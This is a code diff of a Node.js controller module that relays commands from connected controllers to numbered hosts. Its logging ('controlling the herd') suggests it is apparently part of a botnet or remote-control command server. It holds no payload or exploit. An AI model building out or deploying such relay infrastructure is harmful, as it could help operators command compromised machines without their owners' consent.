@@ -1,14 +1,12 @@
 const { Socket } = require('net');
 const { PacketConnection } = require('../protocol/connection');
-const { parsePacket, serializePacket } = require('../protocol/packet');
+const { createPacket, parsePacket, serializePacket } = require('../protocol/packet');
 const host = require('./host');
 
 /**
  * @type Controller[]
  */
 const controllers = [];
-const nonces = {};
-let commandID = 0;
 
 class Controller {
     /**
@@ -17,23 +15,51 @@ class Controller {
     constructor(socket) {
         this.connection = new PacketConnection(socket);
         this.connection.on('packet', (data) => {
-            let packet = parsePacket('control', 'command', data);
-            this.handleCommand(packet);
+            //TODO: validate json-parsed packet
+            this.handleCommand(JSON.parse(data.toString()));
         });
     }
 
+    /**
+     * Handle command received from controller
+     * @param {*} packet
+     */
     handleCommand(packet) {
         switch (packet._ptype.name) {
             case 'relaycommand':
-                host.hosts[packet.id].sendCommand(packet.command);
+                try {
+                    if (packet.id < 0 || packet.id >= host.hosts.length) {
+                        throw new Error('invalid host ID');
+                    }
+                    host.hosts[packet.id].sendCommand(packet.command);
+                } catch (err) {
+                    console.error(err);
+                    this.send(wrapErrorPacket(err))
+                }
+                break;
+            default:
+                //TODO: handle invalid packet type
                 break;
         }
     }
 
-    sendResponse(response) {
-        let buffer = serializePacket('control', 'response', response);
-        this.connection.write(buffer);
+    /**
+     * Send packet to this controller
+     * @param {*} packet
+     */
+    send(packet) {
+        this.connection.write(JSON.stringify(packet));
     }
+}
+
+/**
+ * Wrap error in packet for sending to host
+ * @param {Error} err 
+ */
+function wrapErrorPacket(err) {
+    let errPacket = createPacket('control', 'response', 'servererror');
+    errPacket.message = err.toString();
+    return errPacket; //TODO
 }
 
 /**
@@ -41,15 +67,16 @@ class Controller {
  */
 function handleIncomingController(socket) {
     let controller = new Controller(socket);
-    let index = controllers.push(controller) - 1;
+    controllers.push(controller);
+    console.log(`[+] Now controlling the herd from ${socket.remoteAddress}`);
     socket.on('close', () => {
-        console.log(`- Controller ${index} disconnected`);
-        controllers.splice(index, 1);
+        console.log(`[-] Controller ${socket.remoteAddress} disconnected`);
+        controllers.splice(controllers.findIndex(i => i == controller), 1);
     });
     socket.on('error', () => {
-        console.log(`! Controller ${index} forcibly exited`);
+        console.log(`[!] Controller ${socket.remoteAddress} forcibly exited`);
+        controllers.splice(controllers.findIndex(i => i == controller), 1);
     });
-    console.log(`+ Now controlling the herd from ${socket.remoteAddress}`);
 }
 
 exports.Controller = Controller;
